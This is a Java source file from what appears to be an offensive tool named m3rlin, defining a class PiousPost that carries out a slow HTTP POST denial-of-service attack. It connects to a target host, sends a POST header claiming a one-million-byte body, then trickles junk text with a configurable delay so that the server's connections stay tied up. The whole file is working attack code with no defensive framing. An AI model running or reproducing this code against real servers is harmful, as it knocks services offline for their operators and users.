package m3rlin.p0st;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import m3rlin.Attack;
import m3rlin.utils.Logger;

public class PiousPost extends Attack {
	
	private static Logger log = new Logger("PiousPost");
	
	public PiousPost(String hostname, int port, int interval) {
		super(hostname, port, interval);
	}
	
	public void run() {
		try {
			isRunning = true;
			socket = new Socket(InetAddress.getByName(hostname), port);
			writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF-8"));
			log.info("Attack thread started (" + Thread.currentThread().getName() + ")");
			while(isRunning && !isInterrupted()) {
				writer.write("POST / HTTP/1.1\r\n");
				writer.write("Host: " + hostname + " \r\n");
				writer.write("User-agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
				writer.write("Content-Length: 1000000\r\n");
				writer.write("Connection:close\r\n");
				writer.write("\r\n");
				writer.flush();
				for (int i = 0; i < 100000000; i++) {
					writer.write("h4x0r|h4x0r|h4x0r|h4x0r");
					writer.flush();
					try {
						Thread.sleep(interval);
					} catch (InterruptedException e) { }
				}
			}
		} catch (UnknownHostException e) {
			log.error(Thread.currentThread().getName() + " - Could not locate the host (UnknownHostException)");				
		} catch (ConnectException e) {
			log.error(Thread.currentThread().getName() + " - Could not connect to the socket address, check the port (ConnectException)");			
		} catch (SocketException e) {
			log.error(Thread.currentThread().getName() + " - Error creating or accessing socket (SocketException)");				
		} catch (IOException e1) {
			log.error(Thread.currentThread().getName() + " - I/O error with socket (IOException)");
		} finally {
			stop();
		}
	}
}